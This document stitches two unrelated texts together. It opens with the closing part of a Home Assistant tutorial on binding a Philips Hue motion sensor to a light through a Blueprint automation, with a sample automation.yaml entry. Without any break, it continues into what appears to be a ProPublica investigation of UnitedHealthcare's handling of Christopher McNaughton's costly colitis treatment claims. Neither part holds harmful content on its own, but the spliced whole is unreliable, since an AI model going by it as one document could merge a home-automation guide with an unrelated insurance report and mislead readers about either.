<h3 id="binding-the-light-to-the-sensor">Binding the light to the sensor</h3>
<p>Before binding the light to the sensor in Home Assistant, we must unbind it in the proprietary Hub.
Go to the  menu in the Philips app.
Select the motion sensor and click the <b>Configure in another app</b> button.
You can ensure it’s unbound if the sensor now appears in the previous screen with a <em>Not configured in this app</em> label.
Additionally, the slider should be disabled.</p>
<p><span><img src="https://blog.frankel.ch/assets/resources/home-assistant/philips-hue-sensor-not-configured.webp" alt="Hue Motion Sensor not configured in the Philips app" width="354" height="767"></span></p>
<p>We are now ready to bind the light to the sensor <strong>in Home Assistant</strong> via an <code>Automation</code>.
I mentioned <code>Automation</code> objects in the <a href="https://blog.frankel.ch/home-assistant/2/#other-objects" target="_blank" rel="noopener">previous post on concepts</a>.
As a reminder, an <code>Automation</code> consists of three components:</p>
<ol><li><span>A <em>when</em> condition, the event that triggers the automation</span></li><li><span>A <em>then</em> clause, what to do when the event happens</span></li><li><span>An optional <code>if</code> condition.</span></li></ol>
<p>Each component can consist of one or multiple components assembled via boolean logic.</p>
<p>It’s time to dive a bit deeper.</p>
<p>You can create an automation via the UI by going to the  menu.
It brings you to a screen with three tabs; <code>Automations</code> is the default.
Click on the bottom right <b>Create Automation</b>.
The <code>Automation</code> is so standard that it has a dedicated menu item!</p>
<p><span><img src="https://blog.frankel.ch/assets/resources/home-assistant/ha-ui-create-automation.webp" alt="Create automation screen" width="501" height="323"></span></p>
<p>The non-generic menu items use a <code>Blueprint</code>.
I’ll keep the explanation of <code>Blueprint</code> objects for a later post;
suffice to say for now that it’s akin to a <em>template</em>.</p>
<p><span><img src="https://blog.frankel.ch/assets/resources/home-assistant/ha-ui-new-motion-activated-light.webp" alt="New Motion-activated Light" width="624" height="591"></span></p>
<p>It’s pretty straightforward to configure it.
The <code>Blueprint</code> is already selected.
You must choose your motion sensor and the light(s) you want to turn on.
The UI lists all available choices for the former.
For the latter, you can choose a single light <code>Device</code> or a group in an <code>Area</code> or via a <code>Label</code>.
The final parameter is self-describing: "Time to leave the light on after last motion is detected."
Click on <b>Save</b>.</p>
<p><span><img src="https://blog.frankel.ch/assets/resources/home-assistant/ha-ui-motion-activated-light-created.webp" alt="Motion-activated Light created" width="632" height="665"></span></p>
<p>Congratulations, you’ve successfully implemented your first automation!
It’s a significant step in your journey with Home Assistant, and it’s just the beginning of what you can achieve.
When the sensor detects a motion, it sends the event to Home Assistant.
The latter sees there’s a related automation and turns on the light.
It also starts a timer and resets it every time it receives an event from the sensor.
When it reaches zero, it turns the light off.</p>
<p>You can achieve this by directly writing the YAML configuration.
Locate the file <code>automation.yaml</code> file;
by default, it should be under the <code>/config</code> folder.
It displays the newly created automation:</p>
<div>
<pre><code data-lang="yaml"><span>-</span> <span>id</span><span>:</span> <span>'</span><span>1719829445000'</span>
  <span>alias</span><span>:</span> <span>Turn on the toilet light</span>
  <span>description</span><span>:</span> <span>Turn on the toilet's light when motion is detected</span>
  <span>use_blueprint</span><span>:</span>
    <span>path</span><span>:</span> <span>homeassistant/motion_light.yaml</span>
    <span>input</span><span>:</span>
      <span>motion_entity</span><span>:</span> <span>binary_sensor.motion_sensor_toilettes_motion</span>
      <span>light_target</span><span>:</span>
        <span>device_id</span><span>:</span> <span>0bd1f534865dae40ae66b805c9b2c499</span>
      <span>no_motion_wait</span><span>:</span> <span>240</span></code></pre>
</div>
<p>You can update the YAML snippet, but creating a new automation entry in YAML doesn’t reflect in the UI.</p>
<p>We replaced the proprietary Hub automation with the Home Assistant one.
Yet, the replacement was not on feature parity:
we miss the light brightness!
During the night, the brightness is the same as during the day, whereas we configured it differently in the previous setup.</p>
</div>
</div>
</div>
<div>
<h2 id="conclusion">Conclusion</h2>
<div>
<p>In this, we moved from the proprietary Philips Hue automation between a sensor and a light to one in Home Assistant.
It’s a common scenario, so Home Assistant makes it straightforward via a <code>Blueprint</code>.
Yet, in the end, we missed a crucial feature:
brightness adjustment based on the time.
In our next post, we are going to address this gap.</p>

<p data-pp-blocktype="copy" data-pp-id="2.0">In May 2021, a nurse at UnitedHealthcare called a colleague to share some welcome news about a problem the two had been grappling with for weeks.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="3.0">United provided the health insurance plan for students at Penn State University. It was a large and potentially lucrative account: lots of young, healthy students paying premiums in, not too many huge medical reimbursements going out.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="4.0">But one student was costing United a lot of money. Christopher McNaughton suffered from a crippling case of ulcerative colitis — an&nbsp;ailment that caused him to develop severe arthritis, debilitating diarrhea, numbing fatigue and life-threatening blood clots. His medical bills were running nearly $2 million a year.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="5.0">United had flagged McNaughton’s case as a “high dollar account,” and the company was reviewing whether it needed to keep paying for the expensive cocktail of drugs crafted by a Mayo Clinic specialist that had brought McNaughton’s disease under control after he’d been through years of misery.</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="7.0">On the 2021 phone call, which was recorded by the company, nurse Victoria Kavanaugh told her colleague that a doctor contracted by United to review the case had concluded that McNaughton’s treatment was “not medically necessary.” Her colleague, Dave Opperman, reacted to the news with a long laugh.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="8.0">“I knew that was coming,” said Opperman, who heads up a United subsidiary that brokered the health insurance contract between United and Penn State. “I did too,” Kavanaugh replied.</p>
        
    
                        <figure data-pp-id="9" data-pp-blocktype="audio">

        
<div>
            <p id="unitedhealthcare-employees-discuss-the-denial-of-christopher-mcnaughtons-claim">UnitedHealthcare Employees Discuss the Denial of Christopher McNaughton’s Claim</p>
                <p>David Opperman is an insurance broker who works for UnitedHealthcare. Victoria Kavanaugh is a nurse for United. In this recorded phone call from 2021, the two express relief that a doctor has turned down Penn State student Christopher McNaughton’s claim as “not medically necessary.”</p>
    </div>

<p data-pp-blocktype="copy" data-pp-id="10.0">Opperman then complained about McNaughton’s mother, whom he referred to as “this woman,” for “screaming and yelling” and “throwing tantrums” during calls with United. </p>

<p data-pp-blocktype="copy" data-pp-id="10.1">The pair agreed that any appeal of the United doctor’s denial of the treatment would be a waste of the family’s time and money. </p>

<p data-pp-blocktype="copy" data-pp-id="10.2">“We’re still gonna say no,” Opperman said.</p>
        
    
                    
            
    
                    
<p data-pp-blocktype="copy" data-pp-id="12.0">More than 200 million Americans are covered by private health insurance. But data from state and federal regulators shows that insurers reject about 1 in 7 claims for treatment. Many people, faced with fighting insurance companies, simply give up: <a href="https://www.kff.org/private-insurance/issue-brief/claims-denials-and-appeals-in-aca-marketplace-plans/">One study</a> found that <a href="https://www.kff.org/private-insurance/issue-brief/claims-denials-and-appeals-in-aca-marketplace-plans/">Americans file formal appeals on only 0.1% of claims</a> denied by insurers under the Affordable Care Act.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="13.0">Insurers have wide discretion in crafting what is covered by their policies, beyond some basic services mandated by federal and state law. They often deny claims for services that they deem not “medically necessary.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="14.0">When United refused to pay for McNaughton's treatment for that reason, his family did something unusual. They fought back with a lawsuit, which uncovered a trove of materials, including internal emails and tape-recorded exchanges among company employees. Those records offer an extraordinary behind-the-scenes look at how one of America's leading health care insurers relentlessly fought to reduce spending on care, even as its profits rose to record levels.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="15.0">As United reviewed McNaughton’s treatment, he and his family were often in the dark about what was happening or their rights. Meanwhile, United employees misrepresented critical findings and ignored warnings from doctors about the risks of altering McNaughton’s drug plan.</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="17.0">At one point, court records show, United inaccurately reported to Penn State and the family that McNaughton’s doctor had agreed to lower the doses of his medication. Another time, a doctor paid by United concluded that denying payments for McNaughton’s treatment could put his health at risk, but the company buried his report and did not consider its findings. The insurer did, however, consider a report submitted by a company doctor who rubber-stamped the recommendation of a United nurse to reject paying for the treatment.</p>
        
    
                                  
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="19.0">United declined to answer specific questions about the case, even after McNaughton signed a release provided by the insurer to allow it to discuss details of his interactions with the company. United noted that it ultimately paid for all of McNaughton’s treatments. In a written response, United spokesperson Maria Gordon Shydlo wrote that the company’s guiding concern was McNaughton’s well-being.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="20.0">“Mr. McNaughton’s treatment involves medication dosages that far exceed FDA guidelines,” the statement said. “In cases like this, we review treatment plans based on current clinical guidelines to help ensure patient safety.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="21.0">But the records reviewed by ProPublica show that United had another, equally urgent goal in dealing with McNaughton. In emails, officials calculated what McNaughton was costing them to keep his crippling disease at bay and how much they would save if they forced him to undergo a cheaper treatment that had already failed him. As the family pressed the company to back down, first through Penn State and then through a lawsuit, the United officials handling the case bristled.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="22.0">“This is just unbelievable,” Kavanaugh said of McNaughton’s family in one call to discuss his case. ”They’re just really pushing the envelope, and I’m surprised, like I don’t even know what to say.”</p>

<p data-pp-blocktype="copy" data-pp-id="24.0">Now 31, McNaughton grew up in State College, Pennsylvania, just blocks from the Penn State campus. Both of his parents are faculty members at the university.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="25.0">In the winter of 2014, McNaughton was halfway through his junior year at Bard College in New York. At 6 feet, 4 inches tall, he was a guard on the basketball team and had started most of the team’s games since the start of his sophomore year. He was majoring in psychology.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="26.0">When McNaughton returned to school after the winter holiday break, he started to experience frequent bouts of bloody diarrhea. After just a few days on campus, he went home to State College, where doctors diagnosed him with a severe case of ulcerative colitis.</p>
        
    
                        


   
            
            
            
            

   
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="28.0">A chronic inflammatory bowel disease that causes swelling and ulcers in the digestive tract, ulcerative colitis has no cure, and ongoing treatment is needed to alleviate symptoms and prevent serious health complications. The majority of cases produce mild to moderate symptoms. McNaughton’s case was severe.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="29.0">Treatments for ulcerative colitis include steroids and special drugs known as biologics that work to reduce inflammation in the large intestine.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="30.0">McNaughton, however, failed to get meaningful relief from the drugs his doctors initially prescribed. He was experiencing bloody diarrhea up to 20 times a day, with such severe stomach pain that he spent much of his day curled up on a couch. He had little appetite and lost 50 pounds. Severe anemia left him fatigued. He suffered from other conditions related to his colitis, including crippling arthritis. He was hospitalized several times to treat dangerous blood clots.</p>

<p data-pp-blocktype="copy" data-pp-id="33.0">His hometown doctors referred him to a specialist at the University of Pittsburgh, who tried unsuccessfully to bring his disease under control. That doctor ended up referring McNaughton to Dr. Edward Loftus Jr. at the Mayo Clinic in Minnesota, which has been ranked as the <a href="https://www.mayoclinic.org/departments-centers/gastroenterology-hepatology-digestive-care/sections/expertise-ranking/orc-20348266">best gastroenterology hospital</a> in the country every year since 1990 by U.S. News &amp; World Report.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="34.0">For his first visit with Loftus in May 2015, McNaughton and his mother, Janice Light, charted hospitals along the 900-mile drive from Pennsylvania to Minnesota in case they needed medical help along the way.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="35.0">Mornings were the hardest. McNaughton often spent several hours in the bathroom at the start of the day. To prepare for his meeting with Loftus, he set his alarm for 3:30 a.m. so he could be ready for the 7:30 a.m. appointment. Even with that preparation, he had to stop twice to use a bathroom on the five-minute walk from the hotel to the clinic. When they met, Loftus looked at McNaughton and told him that he appeared incapacitated. It was, he told the student, as if McNaughton were chained to the bathroom, with no outside life. He had not been able to return to school and spent most days indoors, managing his symptoms as best he could.</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="37.0">McNaughton had tried a number of medications by this point, none of which worked. This pattern would repeat itself during the first couple of years that Loftus treated him.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="38.0">In addition to trying to find a treatment that would bring McNaughton’s colitis into remission, Loftus wanted to wean him off the steroid prednisone, which he had been taking since his initial diagnosis in 2014. The drug is commonly prescribed to colitis patients to control inflammation, but prolonged use can lead to severe side effects including cataracts, osteoporosis, increased risk of infection and fatigue. McNaughton also experienced “moon face,” a side effect caused by the shifting of fat deposits that results in the face becoming puffy and rounder.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="39.0">In 2018, Loftus and McNaughton decided to try an unusual regimen. Many patients with inflammatory bowel diseases like colitis take a single biologic drug as treatment. Whereas traditional drugs are chemically synthesized, biologics are manufactured in living systems, such as plant or animal cells. A year’s supply of an individual biologic drug can cost up to $500,000. They are often given through infusions in a medical facility, which adds to the cost.</p>

<p data-pp-blocktype="copy" data-pp-id="41.0">McNaughton had tried individual biologics, and then two in combination, without much success. He and Loftus then agreed to try two biologic drugs together at doses well above those recommended by the U.S. Food and Drug Administration. Prescribing drugs for purposes other than what they are approved for or at higher doses than those approved by the FDA is a common practice in medicine referred to as off-label prescribing. The federal Agency for Healthcare Research and Quality estimates <a href="https://www.ahrq.gov/patients-consumers/patient-involvement/off-label-drug-usage.html">1 in 5 prescriptions</a> written today are for off-label uses.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="42.0">There are drawbacks to the practice. Since some uses and doses of particular drugs have not been extensively studied, the risks and efficacy of using them off-label are not well known. Also, some drug manufacturers have improperly pushed off-label usage of their products to boost sales despite little or no evidence to support their use in those situations. Like many leading experts and researchers in his field, Loftus has been <a href="https://openpaymentsdata.cms.gov/physician/348">paid to do consulting</a> related to the biologic drugs taken by McNaughton. The payments related to those drugs have ranged from a total of $1,440 in 2020 to $51,235 in 2018. Loftus said much of his work with pharmaceutical companies was related to conducting clinical trials on new drugs.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="43.0">In cases of off-label prescribing, patients are depending upon their doctor’s expertise and experience with the drug.“In this case, I was comfortable that the potential benefits to Chris outweighed the risks,” Loftus said.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="44.0">There was evidence that the treatment plan for McNaughton might work, including studies that had found dual biologic therapy to be efficacious and safe. The two drugs he takes, Entyvio and Remicade, have the same purpose — to reduce inflammation in the large intestine — but each works differently in the body. Remicade, marketed by Janssen Biotech, targets a protein that causes inflammation. Entyvio, made by Takeda Pharmaceuticals, works by preventing an excess of white blood cells from entering into the gastrointestinal tract.</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="46.0">As for any suggestion by United doctors that his treatment plan for McNaughton was out of bounds or dangerous, Loftus said “my treatment of Chris was not clinically inappropriate — as was shown by Chris’ positive outcome.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="47.0">The unusual high-dose combination of two biologic drugs produced a remarkable change in McNaughton. He no longer had blood in his stool, and his trips to the bathroom were cut from 20 times a day to three or four. He was able to eat different foods and put on weight. He had more energy. He tapered off prednisone.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="48.0">“If you told me in 2015 that I would be living like this, I would have asked where do I sign up,” McNaughton said of the change he experienced with the new drug regimen.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="49.0">When he first started the new treatment, McNaughton was covered under his family’s plan, and all his bills were paid. McNaughton enrolled at the university in 2020. Before switching to United’s plan for students, McNaughton and his parents consulted with a health advocacy service offered to faculty members. A benefits specialist assured them the drugs taken by McNaughton would be covered by United.</p>

<p data-pp-blocktype="copy" data-pp-id="51.0">McNaughton joined the student plan in July 2020, and his infusions that month and the following month were paid for by United. In September, the insurer indicated payment on his claims was “pending,” something it did for his other claims that came in during the rest of the year.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="52.0">McNaughton and his family were worried. They called United to make sure there wasn’t a problem; the insurer told them, they said, that it only needed to check his medical records. When the family called again, United told them it had the documentation needed, they said. United, in a court filing last year, said it received two calls from the family and each time indicated that all of the necessary medical records had not yet been received.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="53.0">In January 2021, McNaughton received a new explanation of benefits for the prior months. All of the claims for his care, beginning in September, were no longer “pending.” They were stamped “DENIED.” The total outstanding bill for his treatment was $807,086.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="54.0">When McNaughton’s mother reached a United customer service representative the next day to ask why bills that had been paid in the summer were being denied for the fall, the representative told her the account was being reviewed because of “a high dollar amount on the claims,” according to a recording of the call.</p>

<p data-pp-blocktype="copy" data-pp-id="57.0">With United refusing to pay, the family was terrified of being stuck with medical bills that would bankrupt them and deprive McNaugton of treatment that they considered miraculous. </p>

<p data-pp-blocktype="copy" data-pp-id="57.1">They turned to Penn State for help. Light and McNaughton’s father, David, hoped their position as faculty members would make the school more willing to intervene on their behalf.</p>

<p data-pp-blocktype="copy" data-pp-id="57.2">“After more than 30 years on faculty, my husband and I know that this is not how Penn State would want its students to be treated,” Light wrote to a school official in February 2021.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="58.0">In response to questions from ProPublica, Penn State spokesperson Lisa Powers wrote that “supporting the health and well-being of our students is always of primary importance” and that “our hearts go out to any student and family impacted by a serious medical condition.” The university, she wrote, does “not comment on students’ individual circumstances or disclose information from their records.” McNaughton offered to grant Penn State whatever permissions it needed to speak about his case with ProPublica. The school, however, wrote that it would not comment “even if confidentiality has been waived.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="59.0">The family appealed to school administrators. Because the effectiveness of biologics wanes in some patients if doses are skipped, McNaughton and his parents were worried about even a delay in treatment. His doctor wrote that if he missed scheduled infusions of the drugs, there was “a high likelihood they would no longer be effective.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="60.0">During a conference call arranged by Penn State officials on March 5, 2021, United agreed to pay for McNaughton’s care through the end of the plan year that August. Penn State immediately notified the family of the “wonderful news” while also apologizing for “the stress this has caused Chris and your family.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="61.0">Behind the scenes, McNaughton’s review had “gone all the way to the top” at United’s student health plan division, Kavanaugh, the nurse, said in a recorded conversation.</p>

<p data-pp-blocktype="copy" data-pp-id="63.0">The family’s relief was short-lived. A month later, United started another review of McNaughton’s care, overseen by Kavanaugh, to determine if it would pay for the treatment in the upcoming plan year.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="64.0">The nurse sent the McNaughton case to a company called <a href="https://www.mrioa.com/">Medical Review Institute of America</a>. Insurers often turn to companies like MRIoA to review coverage decisions involving expensive treatments or specialized care.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="65.0">Kavanaugh, who was assigned to a special investigations unit at United, let her feelings about the matter be known in a recorded telephone call with a representative of MRIoA.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="66.0">“This school apparently is a big client of ours,” she said. She then shared her opinion of McNaughton’s treatment. “Really this is a case of a kid who’s getting a drug way too much, like too much of a dose,” Kavanaugh said. She said it was “insane that they would even think that this is reasonable” and “to be honest with you, they’re awfully pushy considering that we are paying through the end of this school year.”</p>

<p data-pp-blocktype="copy" data-pp-id="68.0">MRIoA sent the case to <a href="https://www.linkedin.com/in/vikaspabby/">Dr. Vikas Pabby</a>, a gastroenterologist at UCLA Health and a professor at the university’s medical school. His May 2021 review of McNaughton’s case was just one of more than 300 Pabby did for MRIoA that month, for which he was paid $23,000 in total, according to a log of his work produced in the lawsuit.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="69.0">In a May 4, 2021 report, Pabby concluded McNaughton’s treatment was not medically necessary, because United’s policies for the two drugs taken by McNaughton did not support using them in combination.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="70.0">Insurers spell out what services they cover in plan policies, lengthy documents that can be confusing and difficult to understand. Many policies, such as McNaughton’s, contain a provision that treatments and procedures must be “medically necessary” in order to be covered. The definition of medically necessary differs by plan. Some don’t even define the term. McNaughton’s policy contains a five-part definition, including that the treatment must be “in accordance with the standards of good medical policy” and “the most appropriate supply or level of service which can be safely provided.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="71.0">Behind the scenes at United, Opperman and Kavanaugh agreed that if McNaughton were to appeal Pabby’s decision, the insurer would simply rule against him. “I just think it’s a waste of money and time to appeal and send it to another one when we know we’re gonna get the same answer,” Opperman said, according to a recording in court files. At Opperman’s urging, United decided to skip the usual appeals process and arrange for Pabby to have a so-called “peer-to-peer” discussion with Loftus, the Mayo physician treating McNaughton. Such a conversation, in which a patient’s doctor talks with an insurance company’s doctor to advocate for the prescribed treatment, usually only occurs after a customer has appealed a denial and the appeal has been rejected.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="72.0">When Kavanaugh called Loftus’ office to set up a conversation with Pabby, she explained it was an urgent matter and had been requested by McNaughton. “You know I’ve just gotten to know Christopher,” she explained, although she had never spoken with him. “We’re trying to advocate and help and get this peer-to-peer set up.”</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="74.0">McNaughton, meanwhile, had no idea at the time that a United doctor had decided his treatment was unnecessary and that the insurer was trying to set up a phone call with his physician. </p>

<p data-pp-blocktype="copy" data-pp-id="74.1">In the peer-to-peer conversation, Loftus told Pabby that McNaughton had “a very complicated case” and that lower doses had not worked for him, according to an internal MRIoA memo.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="75.0">Following his conversation with Loftus, Pabby created a second report for United. He recommended the insurer pay for both drugs, but at reduced doses. He added new language saying that the safety of using both drugs at the higher levels “is not established.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="76.0">When Kavanaugh shared the May 12 decision from Pabby with others at United, her boss responded with an email calling it “great news.”</p>

<p data-pp-blocktype="copy" data-pp-id="76.1">Then Opperman sent an email that puzzled the McNaughtons.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="77.0">In it, Opperman claimed that Loftus and Pabby had agreed that McNaughton should be on significantly lower doses of both drugs. He said Loftus “will work with the patient to start titrating them down” — or reducing the dosage — “to a normal dose range.” Opperman wrote that United would cover McNaughton’s treatment in the coming year, but only at the reduced doses. Opperman did not respond to emails and phone messages seeking comment.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="78.0">McNaughton didn’t believe a word of it. He had already tried and failed treatment with those drugs at lower doses, and it was Loftus who had upped the doses, leading to his remission from severe colitis.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="79.0">The only thing that made sense to McNaughton was that the treatment United said it would now pay for was dramatically cheaper — saving the company at least hundreds of thousands of dollars a year — than his prescribed treatment because it sliced the size of the doses by more than half.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="80.0">When the family contacted Loftus for an explanation, they were outraged by what they heard. Loftus told them that he had never recommended lowering the dosage. In a letter, Loftus wrote that changing McNaughton’s treatment “would have serious detrimental effects on both his short term and long term health and could potentially involve life threatening complications. This would ultimately incur far greater medical costs. Chris was on the doses suggested by United Healthcare before, and they were not at all effective.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="81.0">It would not be until the lawsuit that it would become clear how Loftus’ conversations had been so seriously misrepresented. </p>

<p data-pp-blocktype="copy" data-pp-id="81.1">Under questioning by McNaughton’s lawyers, Kavanaugh acknowledged that she was the source of the incorrect claim that McNaughton’s doctor had agreed to a change in treatment.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="82.0">“I incorrectly made an assumption that they had come to some sort of agreement,” she said in a deposition last August. “It was my first peer-to-peer. I did not realize that that simply does not occur.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="83.0">Kavanaugh did not respond to emails and telephone messages seeking comment.</p>

<p data-pp-blocktype="copy" data-pp-id="83.1">When the McNaughtons first learned of Opperman’s inaccurate report of the phone call with Loftus, it unnerved them. They started to question if their case would be fairly reviewed.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="84.0">“When we got the denial and they lied about what Dr. Loftus said, it just hit me that none of this matters,” McNaughton said. “They will just say or do anything to get rid of me. It delegitimized the entire review process. When I got that denial, I was crushed.”</p>
        
    
                    
<h3>A Buried Report</h3>
<p data-pp-blocktype="copy" data-pp-id="85.0">While the family tried to sort out the inaccurate report, United continued putting the McNaughton case in front of more company doctors.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="86.0">On May 21, 2021, United sent the case to one of its own doctors, Dr. Nady Cates, for an additional review. The review was marked “escalated issue.” Cates is a United medical director, a title used by many insurers for physicians who review cases. It is work he has been doing as an employee of health insurers since 1989 and at United since 2010. He has not practiced medicine since the early 1990s.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="87.0">Cates, in a deposition, said he stopped seeing patients because of the long hours involved and because “AIDS was coming around then. I was seeing a lot of military folks who had venereal diseases, and I guess I was concerned about being exposed.” He transitioned to reviewing paperwork for the insurance industry, he said, because “I guess I was a chicken.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="88.0">When he had practiced, Cates said, he hadn’t treated patients with ulcerative colitis and had referred those cases to a gastroenterologist.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="89.0">He said his review of McNaughton’s case primarily involved reading a United nurse’s recommendation to deny his care and making sure “that there wasn't a decimal place that was out of line.” He said he copied and pasted the nurse’s recommendation and typed “agree” on his review of McNaughton’s case.</p>

<p data-pp-blocktype="copy" data-pp-id="91.0">Cates said that he does about a hundred reviews a week. He said that in his reviews he typically checks to see if any medications are prescribed in accordance with the insurer’s guidelines, and if not, he denies it. United’s policies, he said, prevented him from considering that McNaughton had failed other treatments or that Loftus was a leading expert in his field.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="92.0">“You are giving zero weight to the treating doctor’s opinion on the necessity of the treatment regimen?” a lawyer asked Cates in his deposition. He responded, “Yeah.” </p>

<p data-pp-blocktype="copy" data-pp-id="92.1">Attempts to contact Cates for comment were unsuccessful.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="93.0">At the same time Cates was looking at McNaughton’s case, yet another review was underway at MRIoA. United said it sent the case back to MRIoA after the insurer received the letter from Loftus warning of the life-threatening complications that might occur if the dosages were reduced.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="94.0">On May 24, 2021, the new report requested by MRIoA arrived. It came to a completely different conclusion than all of the previous reviews.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="95.0">Dr. Nitin Kumar, a gastroenterologist in Illinois, concluded that McNaughton’s established treatment plan was not only medically necessary and appropriate but that lowering his doses “can result in a lack of effective therapy of Ulcerative Colitis, with complications of uncontrolled disease (including dysplasia leading to colorectal cancer), flare, hospitalization, need for surgery, and toxic megacolon.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="96.0">Unlike other doctors who produced reports for United, Kumar discussed the harm that McNaughton might suffer if United required him to change his treatment. “His disease is significantly severe, with diagnosis at a young age,” Kumar wrote. “He has failed every biologic medication class recommended by guidelines. Therefore, guidelines can no longer be applied in this case.” He cited six studies of patients using two biologic drugs together and wrote that they revealed no significant safety issues and found the therapy to be “broadly successful.”</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="98.0">When Kavanaugh learned of Kumar’s report, she quickly moved to quash it and get the case returned to Pabby, according to her deposition.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="99.0">In a recorded telephone call, Kavanaugh told an MRIoA representative that “I had asked that this go back through Dr. Pabby, and it went through a different doctor and they had a much different result.” After further discussion, the MRIoA representative agreed to send the case back to Pabby. “I appreciate that,” Kavanaugh replied. “I just want to make sure, because, I mean, it’s obviously a very different result than what we’ve been getting on this case.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="100.0">MRIoA case notes show that at 7:04 a.m. on May 25, 2021, Pabby was assigned to take a look at the case for the third time. At 7:27 a.m., the notes indicate, Pabby again rejected McNaughton’s treatment plan. While noting it was “difficult to control” McNaughton’s ulcerative colitis, Pabby added that his doses “far exceed what is approved by literature” and that the “safety of the requested doses is not supported by literature.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="101.0">In a deposition, Kavanaugh said that after she opened the Kumar report and read that he was supporting McNaughton’s current treatment plan, she immediately spoke to her supervisor, who told her to call MRIoA and have the case sent back to Pabby for review.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="102.0">Kavanaugh said she didn’t save a copy of the Kumar report, nor did she forward it to anyone at United or to officials at Penn State who had been inquiring about the McNaughton case. “I didn’t because it shouldn’t have existed,” she said. “It should have gone back to Dr. Pabby.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="103.0">When asked if the Kumar report caused her any concerns given his warning that McNaughton risked cancer or hospitalization if his regimen were changed, Kavanaugh said she didn’t read his full report. “I saw that it was not the correct doctor, I saw the initial outcome and I was asked to send it back,” she said. Kavanaugh added, “I have a lot of empathy for this member, but it needed to go back to the peer-to-peer reviewer.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="104.0">In a court filing, United said Kavanaugh was correct in insisting that Pabby conduct the review and that MRIoA confirmed that Pabby should have been the one doing the review.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="105.0">The Kumar report was not provided to McNaughton when his lawyer, <a href="https://gesklaw.com/attorney/jonathan-m-gesk/">Jonathan Gesk</a>, first asked United and MRIoA for any reviews of the case. Gesk discovered it by accident when he was listening to a recorded telephone call produced by United in which Kavanaugh mentioned a report number Gesk had not heard before. He then called MRIoA, which confirmed the report existed and eventually provided it to him.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="106.0">Pabby asked ProPublica to direct any questions about his involvement in the matter to MRIoA. The company did not respond to questions from ProPublica about the case. </p>

